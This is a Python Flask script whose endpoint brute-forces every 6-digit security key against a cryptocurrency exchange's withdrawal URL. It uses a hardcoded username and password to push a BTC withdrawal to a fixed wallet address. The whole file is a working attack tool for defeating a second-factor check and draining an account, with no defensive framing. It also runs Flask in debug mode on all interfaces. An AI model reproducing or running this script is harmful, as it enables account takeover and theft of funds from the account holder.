import logging
import requests
from flask import Flask, jsonify
import itertools

# === Flask App Initialization ===
app = Flask(__name__)

# === User & Withdrawal Details ===
USERNAME = "canary22"
PASSWORD = "T2RyGb$A7"
WITHDRAWAL_URL = "https://sohei.io/withdraw"

WALLET_ADDRESS = "bc1qtytxgkj0wchndamsazp42z3q0h3sqxjcl0c9fu"
CURRENCY = "BTC"
AMOUNT = "0.14895981"

# === Logging Setup ===
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger()

# === Function: Attempt a Withdrawal ===
def attempt_withdrawal(security_key, session):
    logger.debug(f"Trying security key: {security_key}")
    data = {
        'username': USERNAME,
        'password': PASSWORD,
        'security_key': security_key,
        'wallet_address': WALLET_ADDRESS,
        'currency': CURRENCY,
        'amount': AMOUNT
    }

    try:
        response = session.post(WITHDRAWAL_URL, data=data, allow_redirects=True)

        # Check for success in response content
        if 'success' in response.text.lower():
            logger.info(f"✅ SUCCESS: Withdrawal initiated with key: {security_key}")
            return True
        elif 'error' in response.text.lower() or response.status_code == 302:
            logger.warning(f"❌ Failed with key: {security_key} | Status: {response.status_code}")
            return False
        else:
            logger.warning(f"❓ Unexpected response: {response.status_code} | {response.text[:100]}")
            return False

    except Exception as e:
        logger.error(f"🚨 ERROR: While trying key {security_key}: {e}")
        return False

# === Function: Generate 6-digit Keys ===
def generate_security_keys():
    logger.info("🔢 Generating all 6-digit security key combinations...")
    return [''.join(i) for i in itertools.product("0123456789", repeat=6)]

# === Endpoint: Start the Brute Force Process ===
@app.route('/start_withdrawal', methods=['GET'])
def start_withdrawal():
    logger.info("🚀 Starting withdrawal automation process...")
    logger.info(f"🔐 Username: {USERNAME}")
    logger.info(f"💰 Withdrawal Details - Address: {WALLET_ADDRESS}, Coin: {CURRENCY}, Amount: {AMOUNT}")

    session = requests.Session()  # Using a session to maintain cookies and authentication

    keys = generate_security_keys()

    for key in keys:
        success = attempt_withdrawal(key, session)

        if success:
            logger.info(f"🎯 Found valid key: {key}")
            return jsonify({
                "status": "success",
                "message": "Withdrawal initiated successfully.",
                "security_key": key
            }), 200

    logger.error("❗️Failed: No valid key found.")
    return jsonify({
        "status": "failure",
        "message": "Could not find a valid security key."
    }), 400

# === Run Flask App ===
if __name__ == '__main__':
    logger.info("🌐 Flask web service starting on http://0.0.0.0:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
